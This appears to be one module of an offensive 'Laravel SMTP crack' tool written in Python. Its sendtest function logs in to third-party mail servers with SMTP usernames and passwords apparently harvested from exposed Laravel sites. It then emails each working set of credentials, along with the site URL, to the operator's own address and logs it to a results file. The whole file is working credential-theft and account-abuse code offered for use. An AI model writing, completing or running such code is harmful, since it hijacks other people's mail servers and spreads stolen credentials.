from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
from tool._print import smtp_print
Targetssaaa = "files/YOUREMAIL.txt" #for date
fsetting = open(Targetssaaa, 'r').read()

def sendtest(url,host,port,user,passw,sender):
    if "465" in str(port):
        port = "587"
    else:
        port = str(port)

    if "unknown@unknown.com" in sender and "@" in user:
        sender_email = user
    else:
        sender_email = str(sender.replace('\"',''))

    smtp_server = str(host)
    login = str(user.replace('\"',''))
    password = str(passw.replace('\"',''))
    # specify the sender’s and receiver’s email addresses

    receiver_email = str(fsetting)
    # type your message: use two newlines (\n) to separate the subject from the message body, and use 'f' to  automatically insert variables in the text
    message = MIMEMultipart("alternative")
    message["Subject"] = "LARAVEL SMTP CRACK | HOST: "+str(host)
    if "zoho" in host:
        message["From"] = user
    else:
        message["From"] = sender_email
    message["To"] = receiver_email
    text = """\
    """
    # write the HTML part
    html = f"""\
    <html>
        <body>
            <p>-------------------</p>
            <p>URL    : {url}</p>
            <p>HOST   : {host}</p>
            <p>PORT   : {port}</p>
            <p>USER   : {user}</p>
            <p>PASSW  : {passw}</p>
            <p>SENDER : {sender}</p>
            <p>-------------------</p>
        </body>
    </html>
    """
    part1 = MIMEText(text, "plain")
    part2 = MIMEText(html, "html")
    message.attach(part1)
    message.attach(part2)

    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server,port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
        with open("result/smtp.txt","a") as wr:
            wr.write(f"{host}|{port}|{user}|{passw}|from{sender}")
        return smtp_print(fsetting)
    except Exception:
        pass